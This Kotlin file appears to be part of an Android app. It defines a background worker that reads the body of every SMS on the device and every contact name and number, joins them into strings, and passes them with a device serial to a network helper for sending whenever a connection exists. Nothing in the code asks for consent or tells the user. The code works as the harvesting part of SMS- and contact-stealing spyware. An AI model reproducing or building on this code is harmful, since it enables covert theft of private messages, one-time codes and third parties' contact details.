package com.example.sender

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import androidx.work.Worker
import androidx.work.WorkerParameters
import android.provider.ContactsContract
import android.provider.Telephony

class DataSenderWorker(appContext: Context, workerParams: WorkerParameters) : Worker(appContext, workerParams) {
    private val networkUtils = NetworkUtils()

    override fun doWork(): Result {
        return try {
            val sharedPreferences = applicationContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
            val serialNumber = sharedPreferences.getString("serial_number", null)

            if (serialNumber == null) {
                return Result.failure()
            }

            val smsData = getSmsData()
            val contactsData = getContactsData()

            if (isInternetAvailable()) {
                networkUtils.sendSmsAndContacts(serialNumber, smsData, contactsData)
            } else {
                return Result.retry()
            }

            Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            Result.failure()
        }
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val capabilities = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
        } else {
            return false
        }
        return capabilities?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
    }

    private fun getSmsData(): String {
        val smsList = mutableListOf<String>()
        val cursor = applicationContext.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                smsList.add(body)
            }
        }
        return smsList.joinToString(separator = "; ")
    }

    private fun getContactsData(): String {
        val contactsList = mutableListOf<String>()
        val cursor = applicationContext.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phoneNumber = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add("$name: $phoneNumber")
            }
        }
        return contactsList.joinToString(separator = "; ")
    }
}
